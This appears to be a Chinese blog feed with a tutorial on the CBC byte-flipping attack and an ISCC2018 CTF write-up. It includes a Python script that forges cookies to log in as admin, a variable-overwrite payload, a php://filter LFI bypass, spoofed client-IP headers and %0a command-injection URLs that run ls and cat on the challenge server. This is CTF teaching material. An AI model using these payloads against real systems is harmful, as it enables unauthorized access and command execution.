        <content type="html"><![CDATA[<h1 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h1><h2 id="CBC原理"><a href="#CBC原理" class="headerlink" title="CBC原理"></a>CBC原理</h2><p> <img src="http://oy0tigw51.bkt.clouddn.com/201805201723_856.jpg" alt=""></p><h2 id="对cbc的攻击"><a href="#对cbc的攻击" class="headerlink" title="对cbc的攻击"></a>对cbc的攻击</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201805201725_862.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805201726_48.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805202259_97.png" alt=""></p><h2 id="实例说明"><a href="#实例说明" class="headerlink" title="实例说明"></a>实例说明</h2><p>　　我们举例说明一下这个例子，这里有一个明文序列：</p><pre><code>a:2:{s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &#39;Hello sdsdsd!&#39;&quot;;}</code></pre><p>　　我们的目标是将“s:6”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成16个字节的块：</p><pre><code>- Block 1:a:2:{s:4:&quot;name&quot;; - Block 2:s:6:”sdsdsd”;s:8- Block 3::”greeting”;s:20- Block 4::”echo ‘Hello sd- Block 5:sdsd!’”;}</code></pre><p>　　我们需要更改的字符位于<strong>块２</strong>，因此我们需要改变<strong>块1</strong>的密文来改变<strong>块2</strong>的明文。在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。<br>　　因此我们只需要改变在第一个密文块当中，偏移量是2的字节。在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。</p><pre><code>$v = &quot;a:2:{s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &#39;Hello sdsdsd!&#39;&quot;;}&quot;;$enc = @encrypt($v);$enc[2] = chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));$b = @decrypt($enc);</code></pre><p>　　这样我们就把“s:6”当中的数字6转换成数字“7”，达到来了我们想要的目的。</p><h2 id="CTF实例"><a href="#CTF实例" class="headerlink" title="CTF实例"></a>CTF实例</h2><h3 id="iscc2018-Only-admin-can-see-flag"><a href="#iscc2018-Only-admin-can-see-flag" class="headerlink" title="iscc2018-Only admin can see flag"></a>iscc2018-Only admin can see flag</h3><p>查看源码得提示index.txt，访问得到源码 </p><pre><code class="php">&lt;?phpinclude &#39;sqlwaf.php&#39;;define(&quot;SECRET_KEY&quot;, &quot;................&quot;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv(){    $iv=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $iv.=chr(rand(1,255));    }    return $iv;}// 使用aes-128-cbc 模式加密function login($info){    $iv=get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];    setcookie(&quot;iv&quot;, base64_encode($iv));// cookie[iv] = 随机生成的iv 的base64    setcookie(&quot;cipher&quot;, base64_encode($cipher));// cookie[cipher] = 加密值的base64}function show_homepage(){    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;){//发现当账号为admin，才会显示flag，        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Flag is *************&lt;/p&gt;&#39;;    }else{        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;    }    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;    die();}// 解密cipherfunction check_login(){    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;])){        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);//cipher和iv变量均中cookie数组中取        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];        }else{            die(&quot;ERROR!&quot;);        }    }}if (isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;])) {  $username=waf((string)$_POST[&#39;username&#39;]);  $password=waf((string)$_POST[&#39;password&#39;]);  if($username === &#39;admin&#39;){        exit(&#39;&lt;p&gt;You are not real admin!&lt;/p&gt;&#39;);//当我们以admin账号登录时，程序会直接跳出    }else{        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);        show_homepage();    }//否则正常登录，并将用户信息存在info数组中传入login函数，并调用show_homepage函数。}else{  if(isset($_SESSION[&quot;username&quot;])){        check_login();        show_homepage();    }}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; &gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;Paper login form&lt;/title&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&quot;login&quot;&gt;  &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;    &lt;h1&gt;Sign In&lt;/h1&gt;    &lt;input name=&#39;username&#39; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;    &lt;input name=&#39;password&#39; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;    &lt;button&gt;Sign in&lt;/button&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>思路就是构造一个Admin用户，然后将大写的A翻转成小写的a，即是admin。我们点击登录之后，可以在cookie中获取到iv和cipher的值（看14行的login函数），然后我们先将cipher的第9个字符使用异或运算翻转成小写字母a，因为info数组序列化后，我们要翻转的大写字母A在下标为9的位置，每个分组的长度为16，因为返回的iv变量长度为16（要先经过base64解密）</p><ol><li>s:2:{s:8:”userna</li><li>me”;s:5:”Admin”;</li><li>s:8:”password”;s</li><li>:5:”admin”;}</li></ol><p>要第二组的b变为d 就要第一组的u改变 </p><p>python脚本：</p><pre><code class="python">import urllib,base64,requests,reurl = &quot;http://118.190.152.202:8001/index.php&quot;datas = {    &quot;username&quot; : &quot;Admin&quot;,    &quot;password&quot; : &quot;admin&quot;}r = requests.post(url,data=datas)cipher = r.cookies.get(&quot;cipher&quot;)cipher = base64.b64decode(urllib.unquote(cipher))offset = 9new_cipher = cipher[:offset] + chr(ord(cipher[offset])^ord(&quot;A&quot;)^ord(&quot;a&quot;)) + cipher[offset+1:]new_cookies = requests.utils.dict_from_cookiejar(r.cookies)new_cookies[&quot;cipher&quot;] = urllib.quote_plus(base64.b64encode(new_cipher))r2 = requests.get(url,cookies=new_cookies)plain = base64.b64decode(re.findall(&quot;decode\(&#39;(.*)&#39;\)&quot;,r2.text)[0])iv = base64.b64decode(urllib.unquote(new_cookies[&quot;iv&quot;]))old = plain[:len(iv)]new = &#39;a:2:{s:8:&quot;userna&#39;new_iv = &quot;&quot;.join([chr(ord(iv[i])^ord(old[i])^ord(new[i])) for i in xrange(16)])new_cookies[&quot;iv&quot;] = urllib.quote_plus(base64.b64encode(new_iv))r3 = requests.get(url,cookies=new_cookies)print(r3.text)</code></pre><h3 id="bugku"><a href="#bugku" class="headerlink" title="bugku"></a>bugku</h3><p>Bugku上的一道题来做分析：<br>题目链接：<code>http://47.93.190.246:49168/</code><br>进入后发现页面存在源码泄露：<code>index.php.swp</code><br>恢复后审计源码：</p><pre><code>function get_random_iv(){    $random_iv=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $random_iv.=chr(rand(1,255));    }    return $random_iv;}</code></pre><p>首先随机生成了一个16位的iv；<br>然后从</p><pre><code>$info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);</code></pre><p>和</p><pre><code>function login($info){    $iv = get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];    setcookie(&quot;iv&quot;, base64_encode($iv));    setcookie(&quot;cipher&quot;, base64_encode($cipher));}</code></pre><p>可见，对传入的账号和密码进行序列化，作为明文，然后对其进行AES加密，其中使用到了随机生成的iv<br>后将加密后的内容进行base64编码，放入cookie中。</p><pre><code>function check_login(){    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;]))    {        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))        {            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];        }        else        {            die(&quot;ERROR!&quot;);        }    }}</code></pre><p>然后再对传入的cookie中的密文解密，然后对明文就行反序列化（如果反序列化失败就打印出明文的base64编码），后把反序列化后的明文，即Info中的username还给username，最后进行判定:</p><pre><code>function show_homepage(){    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;){        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Flag is $flag&lt;/p&gt;&#39;;    }else{        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;    }    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;}</code></pre><p>如果用户名是admin，就给出flag，否则不给，但值得一提的是：</p><pre><code>if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])){    $username = (string)$_POST[&#39;username&#39;];    $password = (string)$_POST[&#39;password&#39;];    if($username === &#39;admin&#39;)    {        exit(&#39;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#39;);    }    else    {        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);        show_homepage();    }}</code></pre><p>登录时做出了限制，如果用admin登录是显然不行的。<br>所以这时就需要CBC字节翻转攻击来实现了<br>登录时：可以使用</p><pre><code>username=1dmin;password=Mang0;</code></pre><p>此时我们要做的就是把1dmin通过翻转攻击，把’1‘变成‘a’，即可变成admin登录成功得到Flag<br>首先按照步骤：将我们传入的Info进行序列化，得到明文：<br><code>a:2:{s:8:&quot;username&quot;;s:5:&quot;1dmin&quot;;s:8:&quot;password&quot;;s:5:&quot;Mang0&quot;;}</code><br>然后对其进行分组：</p><pre><code>block 1 : a:2:{s:8:&quot;usernablock 2 : me&quot;;s:5:&quot;1dmin&quot;;block 3 : s:8:&quot;password&quot;;sblock 4 : :5:&quot;Mang0&quot;;}</code></pre><p>我们所要改变的即block 2中的偏移量为9的那个明文，即1<br>所以按照攻击方式，应该改变block 1中有相同偏移量的那个密文，即偏移量为9的值<br>所以得到以下公式：<br>cipher = cipher[:9] + chr(ord(cipher[9]) ^ ord(‘1’) ^ ord(‘a’)) + cipher[10:]<br>故可将1dmin变成admin，但有一点需要注意，这样改变后，密文的值发生了改变，将其进行解密后反序列化，是会失败的，从而会把无法反序列化的明文打印出来（因为我们对block 1进行了改变，虽然block 2变成了我们所希望的值，但block 1却变成了未知的量）<br>所以此时，需要改变iv的值来改变block 1的值<br>（注：这就是cbc的处理方式，iv的值改变block1的值，block1的值改变block2的值……）<br>故此，我们需要一个正确的Iv，使block 1依旧为<code>a:2:{s:8:&quot;userna</code><br>故此得到第二个公式：（plain为无法反序列化打印出来的被base64编码的明文）</p><pre><code>want = &#39;a:2:{s:8:&quot;userna&#39;first_16 = &#39;&#39;iv = base64.b64decode(&#39;你一开始随机生成的被base64编码过的iv&#39;)for i in range(16):    first_16 += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))newiv = first_16</code></pre><p>这样就可以将密文前16位的值，即block 1的明文变成我们想要的<code>a:2:{s:8:&quot;userna</code><br>故此即plain伪造成功，此时的plain是绝对可以被反序列化的<br>最后，我们将伪造的密文和伪造的iv传入cookie，即可被解密还原成我们伪造的plain<br>即：<br><code>a:2:{s:8:&quot;username&quot;;s:5:&quot;1dmin&quot;;s:8:&quot;password&quot;;s:5:&quot;Mang0&quot;;}</code><br>变成了<br><code>a:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;Mang0&quot;;}</code><br>最后即可以admin的身份成功登入网站，拿到flag</p>]]></content>
      
      
      <categories>
          
          <category> WebSecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ISCC2018-writeup</title>
      <link href="/archives/4e1d9865/"/>
      <url>/archives/4e1d9865/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p>winhex打开修改高度</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011954_574.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011955_458.png" alt=""></p><p>_Welcome_To_ISCC<em>2018</em></p><h3 id="数字密文"><a href="#数字密文" class="headerlink" title="数字密文"></a>数字密文</h3><p>69742773206561737921 </p><p>16进制转文本 </p><p>给个在线网站</p><p><a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="external">https://www.bejson.com/convert/ox2str/</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171116_151.png" alt=""></p><h3 id="秘密电报："><a href="#秘密电报：" class="headerlink" title="秘密电报："></a>秘密电报：</h3><p>知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA</p><p>在线培根密码解密</p><p><a href="http://tool.ph0en1x.com/bacon/" target="_blank" rel="external">http://tool.ph0en1x.com/bacon/</a></p><p>ILIKEISCC</p><h3 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h3><p>base64解密，</p><p>在线解密<a href="https://base64.supfree.net/" target="_blank" rel="external">https://base64.supfree.net/</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171406_511.png" alt=""></p><p>解密到这里不行了</p><p>U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1ziN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc=  </p><p>然后再用aes解密 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171412_741.png" alt=""></p><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="external">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171413_518.png" alt=""></p><p>把我复制走</p><h3 id="有趣的ISCC"><a href="#有趣的ISCC" class="headerlink" title="有趣的ISCC"></a>有趣的ISCC</h3><p>把图片放进WinHex中观察 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171511_899.png" alt=""></p><p>末尾有很多Unicode</p><p>Unicode转ascii</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171423_933.png" alt=""></p><p>unicode转中文</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171425_238.png" alt=""></p><p>flag{iscc is fun}</p><h3 id="Where-is-the-FLAG？"><a href="#Where-is-the-FLAG？" class="headerlink" title="Where is the FLAG？"></a>Where is the FLAG？</h3><p>TweakPNG打开 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171430_847.png" alt=""></p><p>Adobe Fireworks CS5 处理 </p><p>图层隐层</p><p>拼接一下</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171502_356.png" alt=""></p><h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p>凯撒密码，并且偏移是13</p><p>得到<code>roqtp697t95j3</code>，一看就不是flag，结合提示<code>键盘</code>，所以可能是键盘密码: 即密文在键盘上的下一行所对应的字符是相应明文，</p><h3 id="一只猫的心思"><a href="#一只猫的心思" class="headerlink" title="一只猫的心思"></a>一只猫的心思</h3><p>winhex打开会发现这个是jpg文件，有文件头，但是没有文件尾，搜索之后就会得到文件尾FFD9所在的位置，需要把FFD9后面的十六进制转化为一个新的文件，并且要以（.doc）格式保存  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171528_660.png" alt=""></p><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="external">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a> </p><p>佛曰密码解</p><p>523156615245644E536C564856544E565130354B553064524D6C524E546B4A56535655795645644F5530524857544A4553553943566B644A4D6C524E546C7052523155795645744F536C5248515670555330354452456456576B524854554A585231457956554E4F51305A4855544E4553303153566B64424D6C524A546B7058527A525A5245744F576C5A4854544A5554553554513063304E46524C54564A5652316B795255744F51305A4856544E5554564661566B6C464D6B5252546B70595231557A5245394E516C5A4856544A555355354B566B644E5756524E5455705752316B7A5255564F55305248566B465553564A4356306C4E4D6C524E546B4A565231557952453152556C564A56544A455555354B5530644E5756525054554A56523030795645314F516C5A4857544A4553303143566B64464D305648546B744352314A425645744F576C5A4855544A4651303543566B64564D6B524854554A555230557A52454E4F536C644855544A5554553543566B645A4D6B564A546C4E445231566152456C52576C5A4855544A5553303544516B64564D6C524C54564A55523045795245314F556C4A4856544E455355354B56556C564D6B564E546B70535230315A52457452536C564951544A555455354B565564535156524A54564A575230457956456C4E576C46485454525553303143566B6446576C564A54544A46</p><p>十六进制转换了，转换为字符串：  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171532_778.png" alt=""></p><p>base64解密：  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171557_687.png" alt=""></p><p>base32：  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171615_371.png" alt=""></p><p>十六进制转化： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171616_86.png" alt=""></p><p>base64解密：  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171617_526.png" alt=""></p><p>base32：  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171618_95.png" alt=""></p><p>十六进制转化 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805171619_254.png" alt=""></p><p>F1a9_is_I5cc_ZOl8_G3TP01NT</p><p>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途</p><p>Base32编码是使用32个可打印字符（字母A-Z和数字2-7） </p><p>Base16编码使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码 </p><h3 id="暴力XX不可取"><a href="#暴力XX不可取" class="headerlink" title="暴力XX不可取"></a>暴力XX不可取</h3><p>伪加密修改的几种方法</p><blockquote><p>1、在Mac OS以及部分linux（Kali）系统中，可以直接打开伪加密的ZIP压缩包。</p><p>2、使用检测伪加密的工具ZipCenOp.jar，解密后如果能成功打开ZIP包，则是伪加密，否则说明思路错误。</p><p>3、使用16进制编辑器更改加密标志位。</p></blockquote><p>打开压缩包之后发现需要解压密码</p><p>既然已经知道是伪加密那就直接尝试伪加密，利用伪加密判断工具ZipCenOp</p><pre><code>java -jar ZipCenOp.jar r ISCC-MISC02.zip</code></pre><p>vfppjrnerpbzvat </p><p>rot13 解码</p><p>得到isccwearecoming</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805012218_803.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805012227_276.png" alt=""></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p>f12查看 本地长度绕过修改maxlength=4</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805031858_254.png" alt=""></p><p>输入99999999提交</p><p>得key is 768HKyu678567&amp;*&amp;K</p><h3 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201805071904_900.png" alt=""></p><pre><code>&lt;?php highlight_file(&#39;2.php&#39;); $flag=&#39;{***************}&#39;; if (isset($_GET[&#39;password&#39;])) {       if (strcmp($_GET[&#39;password&#39;], $flag) == 0)   ////如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写）         die(&#39;Flag: &#39;.$flag);       else           print &#39;Invalid password&#39;;   }   ?&gt;</code></pre><p><a href="http://118.190.152.202:8003?password[]=1" target="_blank" rel="external">http://118.190.152.202:8003?password[]=1</a></p><p>ISCC{iscc_ef3w5r5tw_5rg5y6s3t3} </p><h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p>查看源码ISCC{^&amp;*(UIHKJjkadshf}</p><h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p>题目</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805031853_626.png" alt=""></p><p>%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_</p><p>base64解码</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805031853_539.png" alt=""></p><p>flag{Hell0World}</p><h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>好像有个文件忘记删了</p><p>考察源码泄露</p><p>py脚本得到<a href="http://118.190.152.202:8009/index.php.txt" target="_blank" rel="external">http://118.190.152.202:8009/index.php.txt</a></p><p>所以进入得到如下代码</p><pre><code class="php">&lt;?phpinclude &quot;flag.php&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)    die(&quot;flag is here&quot;);if (!isset($_POST[&quot;flag&quot;])     die($_403);foreach ($_GET as $k =&gt; $v){     $$k = $$v;//$k=200 $$k=$_200    所以$_200 = &amp;flag}foreach ($_POST as $k =&gt; $v){    $$k = $v; //$flag =2333}if ( $_POST[&quot;flag&quot;] !== $flag )    die($_403);echo &quot;flag: &quot;. $flag . &quot;\n&quot;;die($_200);?&gt;</code></pre><blockquote><h5 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h5><p>(PHP 4, PHP 5, PHP 7)</p><p><em>foreach</em> 语法结构提供了遍历数组的简单方式。<em>foreach</em> 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</p><pre><code>foreach (array_expression as $value)    statementforeach (array_expression as $key =&gt; $value)    statement</code></pre><p>第一种格式遍历给定的 <em>array_expression</em> 数组。每次循环中，当前单元的值被赋给 <em>$value</em> 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</p><p>第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 <em>$key</em>。</p></blockquote><p><a href="http://www.cleey.com/blog/single/id/841.html" target="_blank" rel="external">深入解析php中的foreach问题</a></p><p>题目中使用了两个foreach并且也使用了’&amp;&amp;’,两个foreach中对 $$key的处理是不一样的，满足条件后会将$flag里面的值打印出来，所以$flag是在flag.php文件文件中的。 行间的代码会将$flag的值给覆盖掉了，所以需要先将$flag的值赋给$_200或$_403变量，然后利用die($_200)或 die($_403)将flag打印出来。</p><p>有很明显的变量覆盖漏洞。要求我们在post语句中有flag，同时在第二个foreach中又把<code>$flag</code>直接覆盖了，所以直接通过echo语句输出的flag是被修改过的。接着看看有什么输出点，比如有个<code>die($_200)</code>，结合第一个foreach的功能，我们可以在第二个foreach之前先将<code>$_200</code>的值覆盖为原flag的值。</p><p>payload:</p><pre><code>index.php?_200=flagPOST:flag=1</code></pre><p>利用前面的<code>die($_403)</code>也可以实现。我们先把原flag的值覆盖到<code>$_403</code>上，然后构造<code>$_POST[&quot;flag&quot;] !== $flag</code>，从而<code>die($_403)</code>输出flag。</p><p>payload2:</p><pre><code>index.php?_403=flag&amp;_POST=1POST:flag=</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201805070015_872.png" alt=""></p><p>ISCC{taolu2333333….} </p><h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p>打开地址随便点文章，一开始可能以为是sql注入</p><p>但仔细看会发现?f=articles可能是存在文件包含漏洞</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805071843_315.png" alt=""></p><p>但是这里有个坑，题目说</p><blockquote><p>你能绕过吗?</p><p>没过滤好啊</p></blockquote><p>因为考察文件包含漏洞所以很有可能过滤php filter协议，尝试大写Php发现绕过成功</p><p><a href="http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=2" target="_blank" rel="external">http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=2</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805071842_517.png" alt=""></p><p>得到base64源码。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805071842_242.png" alt=""></p><p>ISCC{LFIOOOOOOOOOOOOOO}</p><h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p><a href="http://118.190.152.202:8004/" target="_blank" rel="external">http://118.190.152.202:8004/</a></p><p>一开始尝试X-Forwarded-For: 127.0.0.1不行</p><blockquote><pre><code>X-Forwarded-For: 127.0.0.1Contact: 127.0.0.1X-Originating-IP: 127.0.0.1X-Real-IP: 127.0.0.1X-Client-IP: 127.0.0.1Referer: 127.0.0.1From: 127.0.0.1X-Wap-Profile: 127.0.0.1True-Client-IP: 127.0.0.1Client-IP: 127.0.0.1</code></pre></blockquote><p>后来尝试Client-IP: 127.0.0.1</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805021340_915.png" alt=""></p><p>ISCC{iscc_059eeb8c0c33eb62}</p><h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p>万万没想到直接在get方式下命令执行，过滤| 使用%0a绕过</p><p>查看当前目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als</a></p><p>查看源代码<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php</a></p><pre><code> &#39;&#39;,        &#39;;&#39; =&gt; &#39;&#39;,        &#39;|&#39; =&gt; &#39;&#39;,        &#39;-&#39;  =&gt; &#39;&#39;,        &#39;$&#39;  =&gt; &#39;&#39;,        &#39;(&#39;  =&gt; &#39;&#39;,        &#39;)&#39;  =&gt; &#39;&#39;,        &#39;`&#39;  =&gt; &#39;&#39;,        &#39;||&#39; =&gt; &#39;&#39;,    );    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    }    else {        // *nix        $cmd = shell_exec( &#39;ping  -c 1 &#39; . $target );    }    echo  &quot;{$cmd}&quot;;?&gt;</code></pre><p>查看根目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805080036_137.png" alt=""></p><p>一个一个试查看flag在哪里 发现flag在/home/flag</p><p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805080045_61.png" alt=""></p><p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag</a></p><pre><code>ISCC{8a8646c7a2fce16b166fbc68ca65f9e4}</code></pre><p>Reference：</p><p><a href="http://vinc.top/2016/12/22/%E3%80%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%91%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" target="_blank" 